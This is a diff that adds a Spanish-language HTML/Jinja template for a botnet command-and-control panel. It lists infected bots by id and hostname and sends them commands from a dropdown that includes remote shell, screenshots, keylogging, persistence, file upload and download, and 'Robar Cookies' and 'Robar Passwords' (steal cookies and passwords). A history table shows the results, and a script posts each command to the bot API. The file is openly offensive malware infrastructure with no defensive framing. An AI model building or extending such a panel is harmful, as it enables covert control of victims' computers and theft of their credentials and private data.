@@ -1,0 +1,105 @@
+{% extends "base.html" %}
+
+{% block title %}Comandos{% endblock %}
+
+{% block content %}
+<div class="section-header">
+    <h2><i class="fas fa-terminal"></i> Enviar Comando</h2>
+</div>
+
+<div class="section">
+    <div style="display: grid; grid-template-columns: 1fr 1fr 2fr auto; gap: 15px; margin-bottom: 20px; padding: 15px; background: #0a0a0a; border: 1px solid #333; border-radius: 4px;">
+        <select id="bot" style="padding: 10px; background: #1a1a1a; border: 1px solid #0f0; color: #0f0; font-family: inherit; border-radius: 4px;">
+            <option value="">Seleccionar bot...</option>
+            {% for bot in bots %}
+            <option value="{{bot.id}}">{{bot.id}} - {{bot.hostname}}</option>
+            {% endfor %}
+        </select>
+        <select id="cmd" style="padding: 10px; background: #1a1a1a; border: 1px solid #0f0; color: #0f0; font-family: inherit; border-radius: 4px;">
+            <option value="shell">Shell</option>
+            <option value="screenshot">Screenshot</option>
+            <option value="keylog_start">Keylog Start</option>
+            <option value="keylog_stop">Keylog Stop</option>
+            <option value="download">Download File</option>
+            <option value="upload">Upload File</option>
+            <option value="persist">Persistencia</option>
+            <option value="info">System Info</option>
+            <option value="cookies">Robar Cookies</option>
+            <option value="passwords">Robar Passwords</option>
+            <option value="processes">Listar Procesos</option>
+            <option value="kill">KILL BOT</option>
+        </select>
+        <input type="text" id="args" placeholder="Argumentos (opcional)" style="padding: 10px; background: #1a1a1a; border: 1px solid #0f0; color: #0f0; font-family: inherit; border-radius: 4px;">
+        <button class="btn" onclick="send()">ENVIAR</button>
+    </div>
+</div>
+
+<div class="section-header">
+    <h2><i class="fas fa-history"></i> Historial ({{commands|length}})</h2>
+</div>
+
+<div class="section">
+    <table class="data-table" style="font-size: 12px;">
+        <thead>
+            <tr>
+                <th>ID</th>
+                <th>Bot</th>
+                <th>Comando</th>
+                <th>Args</th>
+                <th>Estado</th>
+                <th>Creado</th>
+                <th>Resultado</th>
+            </tr>
+        </thead>
+        <tbody>
+            {% for cmd in commands %}
+            <tr>
+                <td>{{cmd.id}}</td>
+                <td>{{cmd.bot_id}}</td>
+                <td><strong>{{cmd.command}}</strong></td>
+                <td>{{cmd.args or '-'}}</td>
+                <td><span class="status-badge {{cmd.status}}">{{cmd.status.upper()}}</span></td>
+                <td>{{cmd.created_at}}</td>
+                <td style="max-width: 400px;">
+                    {% if cmd.result %}
+                        {% if cmd.result.startswith('{') or cmd.result.startswith('[') %}
+                            <details>
+                                <summary style="color: #0f0; cursor: pointer; font-size: 11px;">Ver JSON</summary>
+                                <pre style="background: #0a0a0a; border: 1px solid #333; padding: 10px; margin-top: 5px; font-size: 10px; color: #888; max-height: 200px; overflow-y: auto; border-radius: 4px; white-space: pre-wrap; word-break: break-all;">{{cmd.result}}</pre>
+                            </details>
+                        {% else %}
+                            <span style="color: #888; font-size: 11px;">{{cmd.result[:100]}}{% if cmd.result|length > 100 %}...{% endif %}</span>
+                        {% endif %}
+                    {% else %}
+                        <span style="color: #555;">-</span>
+                    {% endif %}
+                </td>
+            </tr>
+            {% endfor %}
+        </tbody>
+    </table>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+async function send() {
+    const bid = document.getElementById('bot').value;
+    const cmd = document.getElementById('cmd').value;
+    const args = document.getElementById('args').value;
+    if (!bid) { showToast('Selecciona un bot', 'warning'); return; }
+    try {
+        const r = await fetch('/api/bots/' + bid + '/command', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({command: cmd, args: args ? [args] : []})
+        });
+        const j = await r.json();
+        showToast('Comando enviado! ID: ' + j.cmd_id, 'success');
+        setTimeout(() => location.reload(), 1000);
+    } catch(e) {
+        showToast('Error: ' + e, 'error');
+    }
+}
+</script>
+{% endblock %}
